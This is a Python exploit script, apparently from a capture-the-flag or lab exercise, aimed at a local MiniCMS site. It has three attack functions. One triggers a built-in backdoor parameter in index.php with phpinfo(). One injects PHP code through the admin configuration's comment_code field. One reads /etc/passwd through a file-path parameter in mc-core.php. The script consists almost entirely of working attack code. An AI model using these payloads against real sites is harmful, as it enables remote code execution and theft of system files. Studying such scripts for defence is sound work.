import requests

def zi_dai_hou_men():
	url = 'http://127.0.0.1:8080/index.php'
	data = {
	'1':'phpinfo();'
	}
	print(requests.post(url,data).text)

def hou_tai_shell():
	url = "http://127.0.0.1:8080/mc-admin/conf.php"
	data = {
	"site_name":"%E6%88%91%E7%9A%84%E7%BD%91%E7%AB%99",
	"site_desc":"%E5%8F%88%E4%B8%80%E4%B8%AAMiniCMS%E7%BD%91%E7%AB%99",
	"site_link":"http%3A%2F%2F127.0.0.1%3A8080",
	"user_nick":"%E7%A5%9E%E7%A7%98%E4%BA%BA",
	"user_name":"admin",
	"user_pass":"",
	"comment_code":"',)?><?php phpinfo();?>",
	"save":"%E4%BF%9D%E5%AD%98%E8%AE%BE%E7%BD%AE",
	}
	web = requests.post(url,data).text
	print(web)

def wen_jian_xia_zai():
	url = 'http://127.0.0.1:8080/mc-files/mc-core.php?file=/etc/passwd'
	print(requests.get(url).text)

#zi_dai_hou_men()
#hou_tai_shell()
#wen_jian_xia_zai()